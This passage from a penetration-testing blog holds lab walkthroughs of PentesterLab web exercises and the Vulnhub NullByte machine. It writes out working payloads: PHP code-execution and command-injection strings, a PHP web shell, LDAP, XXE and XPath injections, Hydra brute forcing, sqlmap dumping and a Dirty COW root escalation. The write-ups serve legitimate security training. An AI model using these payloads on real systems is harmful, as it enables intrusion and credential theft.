<p>To exploit this, first we have to add the modifier to the pattern: <code>pattern=/lamer/e</code>. Then we put our code inside the new parameter: <code>new=phpinfo()</code>. The URL now looks like this: <a href="http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=phpinfo%28%29&amp;pattern=/lamer/e&amp;base=Hello%20lamer</a></p>

<p><img class="center" src="/images/pentest/webpentester/phpinfo.png" title="&lsquo;phpinfo&rsquo; &lsquo;phpinfo output&rsquo;" ></p>

<p><strong>Example 4</strong></p>

<p>This one looks like the first example, but with a new addition in the code:</p>

<p><code>php
// ensure name is not empty
assert(trim("'".$_GET['name']."'"));
echo "Hello ".htmlentities($_GET['name']);
</code></p>

<p><a href="https://secure.php.net/manual/ro/function.assert.php">assert</a> checks if the assertions is false, but the most important thing that we need to know is: <strong>if the assertion is given as a string it will be evaluated as PHP code by assert()</strong>.</p>

<p>The assert returns true, because it checks that the name parameter = &lsquo;hacker&rsquo;, which it is. When injecting a single quote, we see this error:</p>

<p><code>plain
Parse error: syntax error, unexpected T_ENCAPSED_AND_WHITESPACE in /var/www/codeexec/example4.php(4) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: 'hacker'' in /var/www/codeexec/example4.php on line 4
</code></p>

<p>I used a PHP sandbox to help me with this. Let&rsquo;s imagine that the name parameter is a simple string with the value of hacker:</p>

<p><code>php
$name = 'hacker';
</code></p>

<p>Thanks to the use of trim, assert will see (and try to evaluate) the value of &lsquo;hacker&rsquo;. Knowing this, if I try injecting <code>hacker'.phpinfo().&lsquo;</code>, inside the code I assume it will look like this:</p>

<p><code>php
$name = 'hacker'.phpinfo().'';
</code></p>

<p>With the string concatenation, phpinfo() is displayed, but we also see at the bottom of the page: <code>Hello hacker'.phpinfo().&lsquo;</code>. The assert was successful, and the code was executed.</p>

<h3>Commands injection</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/cmd1.png" title="&lsquo;cmd injection&rsquo; &lsquo;ping&rsquo;" ></p>

<p>It looks like a ping program:</p>

<p><code>php
&lt;?php
  system("ping -c 2 ".$_GET['ip']);
?&gt;
</code></p>

<p>You can chain another command after the ping one by doing this: <code>ip=127.0.0.1;whoami</code>. Below the ping output, you can now see the whoami output, which in this case is www-data</p>

<p><strong>Example 2</strong></p>

<p>This looks the same like the previous one, but let&rsquo;s see the code:</p>

<p>``` php
&lt;?php
  if (!(preg_match(&lsquo;/^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}$/m&rsquo;, $_GET[&lsquo;ip&rsquo;]))) {</p>

<pre><code> die("Invalid IP address");
</code></pre>

<p>  }
  system(&ldquo;ping -c 2 &rdquo;.$_GET[&lsquo;ip&rsquo;]);
?>
```</p>

<p>There is some regex added now to validate that the ip parameter will indeed look like in IP. However, similar to a previous example, the check won&rsquo;t look on further lines. We can use <code>%0a</code> to introduce a new line, and run our command there: <code>ip=127.0.0.1%0Apwd</code>. And the output is:</p>

<p>``` plain
PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.012 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.022 ms</p>

<p>&mdash;&ndash; 127.0.0.1 ping statistics &mdash;&ndash;
2 packets transmitted, 2 received, 0% packet loss, time 999ms
rtt min/avg/max/mdev = 0.012/0.017/0.022/0.005 ms
/var/www/commandexec
```</p>

<p><strong>Example 3</strong></p>

<p>Same-looking URL, and slightly different code:</p>

<p>``` php
&lt;?php
  if (!(preg_match(&lsquo;/^\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}$/&rsquo;, $_GET[&lsquo;ip&rsquo;]))) {</p>

<pre><code> header("Location: example3.php?ip=127.0.0.1");
</code></pre>

<p>  }
  system(&ldquo;ping -c 2 &rdquo;.$_GET[&lsquo;ip&rsquo;]);
?>
```</p>

<p>This time, the script will redirect the user if the ip parameter doesn&rsquo;t match the regex. However, the execution will continue, even if the browser gets redirected. To stop the execution altogether, it would be necessary to call the <em>die()</em> function after the <em>header()</em> function, which isn&rsquo;t happening in this case. So we can still inject a command, but we&rsquo;ll need to do it through another medium than the browser, or use a proxy. For this, I used Burp, sent the payload <code>ip=127.0.0.1;ls</code>, and looked inside the 302 response to find what I wanted to see:</p>

<p><code>plain
example1.php
example2.php
example3.php
index.html
</code></p>

<h3>LDAP attacks</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/ldap1.png" title="&lsquo;ldap&rsquo; &lsquo;ldap 1&rsquo;" ></p>

<p>This is a new type of exercise, involving LDAP:</p>

<p>``` php
&lt;?php
  require &ldquo;../header.php&rdquo; ;
  $ld = ldap_connect(&ldquo;localhost&rdquo;) or die(&ldquo;Could not connect to LDAP server&rdquo;);
  ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
  ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
  if ($ld) {
   if (isset($_GET[&ldquo;username&rdquo;])) {</p>

<pre><code> $user = "uid=".$_GET["username"]."ou=people,dc=pentesterlab,dc=com";
</code></pre>

<p>   }
   $lb = @ldap_bind($ld, $user,$_GET[&ldquo;password&rdquo;]);</p>

<pre><code>if ($lb) {
   echo "AUTHENTICATED";
}
else {
   echo "NOT AUTHENTICATED";
}
</code></pre>

<p>  }
  require &ldquo;../footer.php&rdquo; ;
?>
```</p>

<p>First, let&rsquo;s learn more about <a href="http://projects.webappsec.org/w/page/13246947/LDAP%20Injection">LDAP</a>:</p>

<blockquote><p>LDAP Injection is an attack technique used to exploit web sites that construct LDAP statements from user-
supplied input.</p>

<p>Lightweight Directory Access Protocol (LDAP) is an open-standard protocol for both querying and
manipulating X.500 directory services. The LDAP protocol runs over Internet transport protocols, such as
TCP. Web applications may use user-supplied input to create custom LDAP statements for dynamic web page
requests.</p>

<p>When a web application fails to properly sanitize user-supplied input, it is possible for an attacker to
alter the construction of an LDAP statement. When an attacker is able to modify an LDAP statement, the
process will run with the same permissions as the component that executed the command. (e.g. Database
server, Web application server, Web server, etc.). This can cause serious security problems where the
permissions grant the rights to query, modify or remove anything inside the LDAP tree. The same advanced
exploitation techniques available in SQL Injection can also be similarly applied in LDAP Injection.</p></blockquote>

<p>This particular example is vulnerable to <a href="https://securitysynapse.blogspot.com/2013/09/dangers-of-ldap-null-base-and-bind.html">NULL bind</a>, where an anonymous user can access information from the LDAP directory without authentication. For this, the values sent to the server have to be null, so instead of just sending empty values, we have to completely remove them:</p>

<p><img class="center" src="/images/pentest/webpentester/ldap1_sol.png" title="&lsquo;ldap 1&rsquo; &lsquo;ldap null&rsquo;" ></p>

<p><strong>Example 2</strong></p>

<p><img class="center" src="/images/pentest/webpentester/ldap2.png" title="&lsquo;ldap&rsquo; &lsquo;ldap 2&rsquo;" ></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php
  require &ldquo;../header.php&rdquo; ;
  $ld = ldap_connect(&ldquo;localhost&rdquo;) or die(&ldquo;Could not connect to LDAP server&rdquo;);
  ldap_set_option($ld, LDAP_OPT_PROTOCOL_VERSION, 3);
  ldap_set_option($ld, LDAP_OPT_REFERRALS, 0);
  if ($ld) {
   $lb = @ldap_bind($ld, &ldquo;cn=admin,dc=pentesterlab,dc=com&rdquo;, &ldquo;pentesterlab&rdquo;);</p>

<pre><code>if ($lb) {
  $pass = "{MD5}".base64_encode(pack("H*",md5($_GET['password'])));
  $filter = "(&amp;(cn=".$_GET['name'].")(userPassword=".$pass."))";
  if (!($search=@ldap_search($ld, "ou=people,dc=pentesterlab,dc=com", $filter))) {
  echo("Unable to search ldap server&lt;br&gt;");
  echo("msg:'".ldap_error($ld)."'&lt;/br&gt;");
} else {
  $number_returned = ldap_count_entries($ld,$search);
  $info = ldap_get_entries($ld, $search);
  if ($info["count"] &lt; 1) {
     //NOK 
     echo "UNAUTHENTICATED";
  }
  else {
    echo "AUTHENTICATED as";
    echo(" ".htmlentities($info[0]['uid'][0]));
  } 
}
</code></pre>

<p>   }
  }
  require &ldquo;../footer.php&rdquo; ;
?>
```</p>

<p>The goal here is to be able to authenticate with any password, and get information from the directory. Now, since the password is being hashed, the only likely place to inject into is the username. To learn more about LDAP, its rules and types of injection, I found a nice <a href="https://www.blackhat.com/presentations/bh-europe-08/Alonso-Parada/Whitepaper/bh-eu-08-alonso-parada-WP.pdf">BlackHat whitepaper</a>. The key takeaway is that the injection will happen in the filter. In our case, the filter is:</p>

<p><code>plain
(&amp;(cn=name)(userPassword=password))
</code></p>

<p>We see here that filter uses <strong>&amp;</strong>, which specifies an AND condition, where both username and password have to be true. Remembering that we can only inject inside the username parameter, here&rsquo;s what we can do:</p>

<p><code>plain
(&amp;(cn=name)(cn=*))%00(userPassword=password))
</code></p>

<p>The ) closes the name filter, then we introduce an always true condition with the * wildcard, the closing ) matches the  one at the beginning of the filter, and the null byte..well, nullifies the rest of the filter.</p>

<p><img class="center" src="/images/pentest/webpentester/ldap2_sol.png" title="&lsquo;ldap 2&rsquo; &lsquo;ldap filter injection&rsquo;" ></p>

<h3>File Upload</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/upload1.png" title="&lsquo;upload1&rsquo; &lsquo;file upload&rsquo;" ></p>

<p>It looks like we can upload an image and find it in the <code>/upload/images/</code> directory:</p>

<p>``` php
&lt;?php
if(isset($<em>FILES[&lsquo;image&rsquo;]))
{
  $dir = &lsquo;/var/www/upload/images/&rsquo;;
  $file = basename($</em>FILES[&lsquo;image&rsquo;][&lsquo;name&rsquo;]);
  if(move_uploaded_file($_FILES[&lsquo;image&rsquo;][&lsquo;tmp_name&rsquo;], $dir. $file))
  {
  echo &ldquo;Upload done&rdquo;;
  echo &ldquo;Your file can be found <a href=\"/upload/images/".htmlentities($file)."\">here</a>&rdquo;;
  }
  else
  {</p>

<pre><code>echo 'Upload failed';
</code></pre>

<p>  }
}
?>
```</p>

<p>Obviously, I am thinking about uploading a PHP shell instead. But first, I wanted to see if there is anything already in the images folder, and I wasn&rsquo;t disappointed:</p>

<p><img class="center" src="/images/pentest/webpentester/hacker.png" title="&lsquo;lol&rsquo; &lsquo;haxxor chat&rsquo;" ></p>

<p>Ok, now it&rsquo;s time for the shell. I created a basic PHP shell:</p>

<p><code>php
&lt;?php
  system($_GET["cmd"]);
?&gt;
</code></p>

<p>Uploaded it, navigated to it and passed a command:</p>

<p><code>plain
http://192.168.217.138/upload/images/ashell.php?cmd=pwd
/var/www/upload/images
</code></p>

<p><strong>Example 2</strong></p>

<p>Same functionality, but this time the script doesn&rsquo;t allow PHP extensions:</p>

<p>``` php
&lt;?php
if(isset($<em>FILES[&lsquo;image&rsquo;]))
{
  $dir = &lsquo;/var/www/upload/images/&rsquo;;
  $file = basename($</em>FILES[&lsquo;image&rsquo;][&lsquo;name&rsquo;]);</p>

<pre><code>if (preg_match('/\.php$/',$file)) {
    DIE("NO PHP");
}
</code></pre>

<p>  if(move_uploaded_file($_FILES[&lsquo;image&rsquo;][&lsquo;tmp_name&rsquo;], $dir . $file))
  {
  echo &lsquo;Upload done !&rsquo;;
  echo &lsquo;Your file can be found <a href="http://chousensha.github.io/upload/images/'.htmlentities($file).'">here</a>&rsquo;;
  }
  else
  {</p>

<pre><code>echo 'Upload failed';
</code></pre>

<p>  }
}
?>
```</p>

<p>The code checks that an extension may not end in php. Uploading a .php file followed by a non-existent extension will cause the server to ignore the unknown extension and switch to the next one it knows. I uploaded the same shell as <code>ashell.php.fail</code>:</p>

<p><code>plain
http://192.168.217.138/upload/images/ashell.php.fail?cmd=ls%20/home
user
</code></p>

<h3>XML attacks</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xml1.png" title="&lsquo;xml1&rsquo; &lsquo;xml 1&rsquo;" ></p>

<p>A twist on the previous challenges, this time with the use of XML:</p>

<p><code>php
Hello  
&lt;?php
  $xml=simplexml_load_string($_GET['xml']);
  print_r((string)$xml);
?&gt;
</code></p>

<p>This particular vulnerability revolves around <a href="https://phpsecurity.readthedocs.io/en/latest/Injection-Attacks.html#xml-injection">XML injection</a>:</p>

<blockquote><p>Custom entities can be defined by including them directly in an optional DOCTYPE and the expanded
value they represent may reference an external resource to be included. It is this capacity of
ordinary XML to carry custom references which can be expanded with the contents of an external
resources that gives rise to an XXE vulnerability.</p></blockquote>

<p>So, I defined the following entity:</p>

<p><code>plain
&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;
</code></p>

<p>This entity can be referenced with <code>&hacker;</code>. Of course, we will need to URL encode it. Here&rsquo;s the URL with the XML injection:</p>

<p><code>plain
192.168.217.138/xml/example1.php?xml=&lt;!DOCTYPE results [&lt;!ENTITY hacker SYSTEM "file:///etc/hosts"&gt;]&gt;&lt;test&gt;%26hacker%3B&lt;/test&gt;
</code></p>

<p><img class="center" src="/images/pentest/webpentester/xml1_inj.png" title="&lsquo;xml1&rsquo; &lsquo;xml injection&rsquo;" ></p>

<p><strong>Example 2</strong></p>

<p>Another hello page, but the URL is a bit different: <a href="http://192.168.217.138/xml/example2.php?name=hacker">http://192.168.217.138/xml/example2.php?name=hacker</a></p>

<p>``` php
  $x = &ldquo;<data><users><user><name>hacker</name><message>Hello hacker</message><password>pentesterlab</password></user><user><name>admin</name><message>Hello admin</message><password>s3cr3tP4ssw0rd</password></user></users></data>&rdquo;;</p>

<p>  $xml=simplexml_load_string($x);
  $xpath = &ldquo;users/user/name[.=&lsquo;&rdquo;.$_GET['name&rsquo;].&ldquo;&lsquo;]/parent::*/message&rdquo;;
  $res = ($xml->xpath($xpath));
  while(list( ,$node) = each($res)) {</p>

<pre><code>echo $node;
</code></pre>

<p>  }
```</p>

<p>We see here some XML data containing users and passwords, and user input being used to construct an <a href="https://www.w3schools.com/xml/xml_xpath.asp">XPATH</a> query. XPATH is used to navigate through elements and attributes in an XML document.</p>

<p>With a name of hacker, the XPATH would look like this:</p>

<p><code>plain
users/user/name[.='hacker']/parent::*/message
</code></p>

<p><a href="https://www.owasp.org/index.php/XPATH_Injection">XPATH injection</a> is similar to SQL injection. Here we can inject inside the name input to create an always true condition and get rid of the remaining query as follows: <code>hacker' or 1=1]%00</code>. Now the query looks like this:</p>

<p><code>plain
users/user/name[.='hacker' or 1=1]%00']/parent::*/message
</code></p>

<p><img class="center" src="/images/pentest/webpentester/xml2.png" title="&lsquo;xml2&rsquo; &lsquo;xpath injection&rsquo;" ></p>

<p>Wow, this was a really fun challenge, and I hadn&rsquo;t done a web app challenge in a while! Many thanks to PentesterLab for this challenge and their help when I had questions! They also have their own course for the challenge <a href="https://pentesterlab.com/exercises/web_for_pentester/course">here</a></p>

<p>Until next time, straight from the cow&rsquo;s mouth:</p>

<p>``` plain
/ You are fighting for survival in your \
\ own sweet and gentle way.             /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pentest lab - NullByte]]></title>
    <link href="http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte/"/>
    <updated>2017-04-18T11:00:06-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/04/18/pentest-lab-nullbyte</id>
    <content type="html"><![CDATA[<p>Today I&rsquo;m back with another vulnerable machine from Vulnhub! It&rsquo;s' been a while since I&rsquo;ve done one, and I was getting restless :D The target for today is called NullByte, and the goal is to read /root/proof.txt</p>

<!-- more -->


<p>I am going to use alternate tools to accomplish the enumeration tasks, instead of the usual Nmap ping scan. To identify the machine on the network, I&rsquo;ll go with <strong>netdiscover</strong> this time:</p>

<p>``` plain
netdiscover -r 192.168.217.0/24</p>

<p> Currently scanning: Finished!   |   Screen View: Unique Hosts</p>

<p> 29 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 1740</p>

<hr />

<p>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname</p>

<hr />

<p> &hellip;          <br/>
 192.168.217.135 00:0c:29:57:bc:ff      4     240  Unknown vendor            <br/>
 &hellip;<br/>
```</p>

<p>By correlating the VMware MAC address with the one in the scan, I know the IP of the target is 192.168.217.135. Next, I port scanned the target:</p>

<p>``` plain
nmap -T4 -p- -sV 192.168.217.135</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-04-18 11:51 EDT
Nmap scan report for 192.168.217.135
Host is up, received arp-response (0.00016s latency).
Not shown: 65531 closed ports
Some closed ports may be reported as filtered due to &mdash;defeat-rst-ratelimit
Reason: 65531 resets
PORT      STATE SERVICE REASON         VERSION
80/tcp    open  http    syn-ack ttl 64 Apache httpd 2.4.10 ((Debian))
111/tcp   open  rpcbind syn-ack ttl 64 2-4 (RPC #100000)
777/tcp   open  ssh     syn-ack ttl 64 OpenSSH 6.7p1 Debian 5 (protocol 2.0)
53755/tcp open  status  syn-ack ttl 64 1 (RPC #100024)
```</p>

<p>Hmm, SSH on port 777? Oh well, let&rsquo;s look at the web server first:</p>

<p><img class="center" src="/images/pentest/nullbyte/web.png" title="&lsquo;nullbyte web&rsquo; &lsquo;nullbyte web page&rsquo;" ></p>

<p>Just an image, nothing in the source, no robots.txt. I needed to see if there are any other interesting directories, but instead of Dirbuster, I used TheColonial&rsquo;s <a href="https://github.com/OJ/gobuster">Gobuster</a>, which is a CLI tool written in Go:</p>

<p>``` plain
gobuster -u <a href="http://192.168.217.135/">http://192.168.217.135/</a> -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>

<h1>Gobuster v1.2                OJ Reeves (@TheColonial)</h1>

<p>[+] Mode         : dir
[+] Url/Domain   : <a href="http://192.168.217.135/">http://192.168.217.135/</a>
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt</p>

<h1>[+] Status codes : 200,204,301,302,307</h1>

<p>/uploads (Status: 301)
/javascript (Status: 301)</p>

<h1>/phpmyadmin (Status: 301)</h1>

<p>```</p>

<p>Unfortunately, nothing in there either. The only thing that we have so far is an image. Let&rsquo;s hope there is no (or very rudimentary) steganography involved. I looked at the metadata of the image:</p>

<p><code>plain
exiftool main.gif
ExifTool Version Number         : 10.40
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2017:04:18 12:24:59-04:00
File Access Date/Time           : 2017:04:18 12:24:59-04:00
File Inode Change Date/Time     : 2017:04:18 12:24:59-04:00
File Permissions                : rw-r--r--
File Type                       : GIF
File Type Extension             : gif
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
Megapixels                      : 0.071
</code></p>

<p>Hello there, conspicuous comment section! On a hunch, I tried navigating to a folder with that name on the web server, and finally seeing something promising:</p>

<p><img class="center" src="/images/pentest/nullbyte/key.png" title="&lsquo;key&rsquo; &lsquo;key form&rsquo;" ></p>

<p>And in the source, there is a comment stating that &ldquo;this form isn&rsquo;t connected to mysql, password ain&rsquo;t that complex&rdquo;. Ok, so no SQLi then. I took the hint and set to brute forcing the password. I used Hydra for this, so I had to take note of the form parameters:</p>

<p>``` html</p>

<center>
<form method="post" action="index.php">
Key:<br>
<input type="password" name="key">
</form>
</center>


<p>```</p>

<p>Also, trying the wrong key gives the message invalid key. Armed with this info, I constructed the Hydra query:</p>

<p><code>plain
hydra 192.168.217.135 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l meh -P /usr/share/dict/words -t 10 -w 10
</code>
This looks ugly, so let me break it into pieces:</p>

<ul>
<li><p>192.168.217.135 = target name</p></li>
<li><p>http-form-post = the method used</p></li>
<li><p>&ldquo;/kzMb5nVYJw/index.php&rdquo; = URL</p></li>
<li><p>key=^PASS^:invalid key" = the form parameter is called key, the PASS variable will be replaced with passwords from the password file, and Hydra will see as successful a response that doesn&rsquo;t contain the string &ldquo;invalid key&rdquo;</p></li>
<li><p>-l meh = you have to specify a username for Hydra to work, even though in this case there was no user, so I put something random</p></li>
<li><p>-P /usr/share/dict/words = password File</p></li>
<li><p>-t 10 = number of Threads</p></li>
<li><p>-w 10 = timeout value</p></li>
</ul>


<p>``` plain
Hydra v8.3 &copy; 2016 by van Hauser/THC &ndash; Please do not use in military or secret service organizations, or for illegal purposes.</p>

<p>Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) starting at 2017-04-18 13:11:54
[DATA] max 10 tasks per 1 server, overall 64 tasks, 99171 login tries (l:1/p:99171), ~154 tries per task
[DATA] attacking service http-post-form on port 80
[STATUS] 1170.00 tries/min, 1170 tries in 00:01h, 98001 to do in 01:24h, 10 active
[STATUS] 1173.33 tries/min, 3520 tries in 00:03h, 95651 to do in 01:22h, 10 active
[STATUS] 1173.86 tries/min, 8217 tries in 00:07h, 90954 to do in 01:18h, 10 active
[STATUS] 1174.00 tries/min, 17610 tries in 00:15h, 81561 to do in 01:10h, 10 active
[STATUS] 1174.32 tries/min, 36404 tries in 00:31h, 62767 to do in 00:54h, 10 active
[80][http-post-form] host: 192.168.217.135   login: meh   password: elite
1 of 1 target successfully completed, 1 valid password found
Hydra (<a href="http://www.thc.org/thc-hydra">http://www.thc.org/thc-hydra</a>) finished at 2017-04-18 13:45:57
```</p>

<p>We can see that Hydra found the password: elite ! Inputting it takes us to another form:</p>

<p><img class="center" src="/images/pentest/nullbyte/username.png" title="&lsquo;username&rsquo; &lsquo;search username&rsquo;" ></p>

<p>Whatever I entered into the form, I got the message &ldquo;Fetched data successfully&rdquo;. I looked at the source code and found another page to check:</p>

<p>``` html</p>

<p>Search for usernames: </p>


<hr>


<p><form action="420search.php" method="get">
Enter username:<br>
<input type="text" name="usrtosearch">
</form>
```</p>

<p>Navigating to 420search.php revealed 2 usernames:</p>

<p>``` plain
EMP ID :1
EMP NAME : ramses</p>

<h2>EMP POSITION :</h2>

<p>EMP ID :2
EMP NAME : isis</p>

<h2>EMP POSITION : employee</h2>

<p>Fetched data successfully
```
I pointed sqlmap to the usrtosearch parameter and was able to pull data from the DB:</p>

<p><code>plain
sqlmap -u "http://192.168.217.135/kzMb5nVYJw/420search.php?usrtosearch=isis" -p usrtosearch --dbms=MySQL --tables
...
[04:24:25] [INFO] fetching tables for databases: 'information_schema, mysql, performance_schema, phpmyadmin, seth'
...
Database: seth
[1 table]
+----------------------------------------------+
| users                                        |
+----------------------------------------------+
...
</code></p>

<p>Next I enumerated the users table in the seth DB, and I got a password for ramses:</p>

<p><img class="center" src="/images/pentest/nullbyte/users.png" title="&lsquo;users&rsquo; &lsquo;users csv&rsquo;" ></p>

<p>I went back to that unconventional SSH port and tried to log in as ramses with the password: YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE . When that didn&rsquo;t work, I fed it to Google and the first MD5 decoder that popped decrypted it as <code>omega</code></p>

<p>``` plain
ssh -p 777 <a href="&#109;&#97;&#105;&#108;&#x74;&#111;&#58;&#x72;&#x61;&#109;&#x73;&#101;&#115;&#64;&#x31;&#x39;&#50;&#46;&#x31;&#x36;&#x38;&#46;&#x32;&#x31;&#x37;&#x2e;&#49;&#x33;&#53;">&#114;&#97;&#109;&#115;&#101;&#115;&#64;&#49;&#x39;&#x32;&#46;&#x31;&#54;&#56;&#x2e;&#50;&#x31;&#55;&#46;&#x31;&#51;&#53;</a>
<a href="&#109;&#97;&#x69;&#108;&#116;&#111;&#58;&#x72;&#97;&#109;&#115;&#101;&#115;&#64;&#49;&#57;&#x32;&#x2e;&#x31;&#x36;&#56;&#x2e;&#x32;&#x31;&#55;&#46;&#49;&#51;&#x35;">&#114;&#97;&#x6d;&#115;&#x65;&#x73;&#64;&#x31;&#x39;&#50;&#x2e;&#x31;&#54;&#x38;&#46;&#50;&#49;&#55;&#x2e;&#x31;&#51;&#53;</a>&rsquo;s password:</p>

<p>The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.</p>

<p>Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Aug  2 01:38:58 2015 from 192.168.1.109
ramses@NullByte:~$
```</p>

<p>Time to look around the system!</p>

<p><code>plain
ls -l /home
total 12
drwxr-xr-x 2 bob    bob    4096 Aug  2  2015 bob
drwxr-xr-x 2 eric   eric   4096 Aug  2  2015 eric
drwxr-xr-x 2 ramses ramses 4096 Aug  2  2015 ramses
</code></p>

<p>Nothing interesting in those home directories. I looked at the kernel version next:</p>

<p>``` plain
uname -v</p>

<h1>1 SMP Debian 3.16.7-ckt11-1+deb8u2 (2015-07-17)</h1>

<p>```</p>

<p>A bit of google-fu revealed that this kernel is vulnerable to CVE-2016-5195, or more popularly known as the <a href="https://www.exploit-db.com/exploits/40616/">Dirty Cow exploit</a> . It is possible to exploit a race condition to escalate privileges to root! I downloaded the source code to the NullByte VM, commented out the x64 payload and uncommented the x86 one, and then I compiled it with <code>gcc dirtycow.c -o dirtycow -pthread</code>. I got some warnings, but was able to run it successfully:</p>

<p><code>plain
./dirtycow
DirtyCow root privilege escalation
Backing up /usr/bin/passwd.. to /tmp/bak
Size of binary: 53112
Racing, this may take a while..
thread stopped
/usr/bin/passwd is overwritten
Popping root shell.
Don't forget to restore /tmp/bak
thread stopped
root@NullByte:/home/ramses# whoami
root
</code></p>

<p>The system crashed shortly afterwards, so I followed the advice in the exploit source code and did <code>echo 0 > /proc/sys/vm/dirty_writeback_centisecs</code>, and it didn&rsquo;t crash anymore. With this, I was able to read the flag:</p>

<p>``` plain
cat /root/proof.txt
adf11c7a9e6523e630aaf3b9b7acb51d</p>

<p>It seems that you have pwned the box, congrats.
Now you done that I wanna talk with you. Write a walk &amp; mail at
<a href="&#109;&#x61;&#x69;&#x6c;&#x74;&#x6f;&#x3a;&#120;&#108;&#x79;&#48;&#110;&#64;&#115;&#x69;&#103;&#x61;&#x69;&#110;&#x74;&#46;&#111;&#114;&#103;">&#x78;&#108;&#x79;&#48;&#110;&#x40;&#x73;&#105;&#103;&#97;&#x69;&#110;&#116;&#x2e;&#111;&#114;&#103;</a> attach the walk and proof.txt
If sigaint.org is down you may mail at <a href="&#109;&#97;&#105;&#108;&#116;&#x6f;&#58;&#x6e;&#x62;&#x73;&#x6c;&#121;&#x30;&#110;&#x40;&#103;&#x6d;&#x61;&#105;&#108;&#46;&#99;&#111;&#x6d;">&#x6e;&#98;&#x73;&#108;&#121;&#x30;&#x6e;&#x40;&#103;&#x6d;&#x61;&#105;&#108;&#x2e;&#x63;&#111;&#109;</a></p>

<p>USE THIS PGP PUBLIC KEY</p>

<p>&mdash;&mdash;-BEGIN PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
Version: BCPG C# v1.6.1.0</p>

<p>mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
Gms=
=PiAQ
&mdash;&mdash;-END PGP PUBLIC KEY BLOCK&mdash;&mdash;&ndash;
```</p>

<p>After completing this and looking at other walkthroughs to see alternate ways of exploitation, I realized that I completely missed the way this VM was supposed to be exploited, so below is the intended way of solving this:</p>

<p>Inside ramses' home folder is a <strong>.bash_history</strong> file that I neglected reading:</p>

<p><code>plain
sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch
clear
sudo -s
cd /
ls
exit
</code></p>

<p>An interesting path and binary. Let&rsquo;s see it on the filesystem:</p>

<p><code>plain
ls -l /var/www/backup
total 12
-rwsr-xr-x 1 root root 4932 Aug  2  2015 procwatch
-rw-r--r-- 1 root root   28 Aug  2  2015 readme.txt
cat readme.txt
I have to fix this mess...
</code></p>

<p>A SUID executable and a comment alluding to a mess..hmm, what could go wrong here..</p>

<p><code>plain
./procwatch
  PID TTY          TIME CMD
 1535 pts/0    00:00:00 procwatch
 1536 pts/0    00:00:00 sh
 1537 pts/0    00:00:00 ps
</code></p>

<p>This looks like the output of the <strong>ps</strong> command. Let&rsquo;s see a normal ps:</p>

<p><code>plain
ps
  PID TTY          TIME CMD
 1555 pts/0    00:00:00 bash
